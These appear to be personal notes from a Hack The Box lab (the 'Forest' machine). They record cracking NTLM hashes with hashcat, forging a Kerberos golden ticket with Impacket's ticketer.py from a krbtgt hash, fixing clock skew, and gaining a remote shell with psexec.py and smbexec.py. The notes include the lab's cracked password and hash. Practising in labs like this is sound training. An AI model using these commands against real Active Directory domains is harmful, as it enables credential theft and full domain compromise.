
We have hashes.out file
```
cat hashes.out | grep ::: | awk -F: '{print $4}'
```
We simply print the 4th part of the hash
![[Pasted image 20231115135515.png]]

```
cat hashes.out | grep ::: | awk -F: '{print $1":"$4}'
```
![[Pasted image 20231115140805.png]]

Hashcat  NTLM version 1000
Will get a token length exception error so will do a little tweak in command
```
.\hashcat.exe --user -m 1000 -D 2 .\hashes4.txt .\rockyou.txt -O
```
![[Pasted image 20231115141135.png]]

So we got the password for user santi
```
user:santi
passwd:plokmijnuhb
```

This is what we will be targetting
![[Pasted image 20231115141824.png]]

```
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
```

```
python3 ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local  Wedontexist
```

```
To get the domain SID
GET-ADDomain htb.local
```
![[Pasted image 20231115141951.png]]

```
cd /usr/share/doc/python3-impacket/examples
```
![[Pasted image 20231115142500.png]]
You can see we have tickey.py

![[Pasted image 20231115142745.png]]
```
export KRB5CCNAME=Wedontexist.ccache 
```
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

We have an error even though we have added the 
10.10.10.161 htb.local in the host file than also we got the skew error
![[Pasted image 20231115143228.png]]

So we have learnt that time actually MATTERS
if we recall and have a look into our Nmap scan we can say that there's a deviation of time
![[Pasted image 20231115143538.png]]

I tried to do what i have done earlier but had no success in it 
```
timedatectl set-ntp true
timedatectl set-ntp false
ntpdate <domain ip address>
```

Will do Brute Force 
```
for i in $(seq 00 24); do date -s $i:36:00; psexec.py htb.local/Wedontexist@10.10.10.161 -k -no-pass; done
```
 
Finally Finally it connected today 
```
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

```
psexec.py -debug -k -no-pass htb.local/Wedontexist@forest
```

Have to done changes to the host file
added - htb.local & forest
![[Pasted image 20231116175043.png]]

Host File
![[Pasted image 20231116175104.png]]


Let's Try wmiexec.py and it didn't worked
```
wmiexec.py -debug -k -no-pass htb.local/Wedontexist@forest
```


But smbexec worked
```
smbexec.py -debug -k -no-pass htb.local/Wedontexist@forest
```


So now the box is pwned completly 